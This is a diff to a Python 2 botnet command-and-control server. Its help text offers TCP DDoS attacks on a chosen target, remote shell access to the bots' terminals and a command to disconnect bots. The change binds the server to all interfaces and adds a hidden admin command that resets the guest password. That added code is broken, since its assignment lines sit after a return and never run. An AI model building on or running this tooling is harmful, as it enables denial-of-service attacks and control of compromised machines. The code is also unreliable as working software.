@@ -7,7 +7,7 @@ from json import load
 from urllib2 import urlopen
 from thread import start_new_thread
 
-connect = "localhost" # IP. Usually empty.
+connect = "" # IP. Leave empty
 conport = 8080 # Your port
 infport = 8888 # Bot port
 
@@ -95,6 +95,10 @@ def clientThread(conn):
 					conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
 					conn.sendall("[?] >killbots - Disconnects all bots\r\n")
 					conn.sendall("[?] >shell - Allows the host to use commands from the bots terminal\r\n")
+					if rank.startswith(rankAdmin):
+						conn.sendall("\r\n")
+						conn.sendall("[>] Secret Admin Command [<]\r\n")
+						conn.sendall("[?] >password - Changes guest password for this session only\r\n")
 
 				if message.lower().startswith(">status"):
 					conn.sendall("[+] Clients Connected: %s\r\n" % clients)
@@ -105,6 +109,17 @@ def clientThread(conn):
 					conn.sendall("[?] Also coded the client.py file from scratch\r\n")
 					conn.sendall("[?] Picses - Coded the bot connection\r\n")
 					conn.sendall("[?] Mac.G - Helped figure out how to broadcast commands using a list\r\n")
+
+				if message.lower().startswith(">password"):
+					if rank.startswith(rankAdmin):
+						conn.sendall("[>] This will change the password to guest rank for this session only [<]\r\n")
+						def newPass(conn, prefix="New Password: "):
+							conn.send(prefix)
+							return conn.recv(512)
+
+							newPass = newPass(conn)
+							pwordGuest = newPass
+							conn.sendall("[?] New Guest Password: %s\r\n" % pwordGuest)
 			except:
 				break
 			if not message:
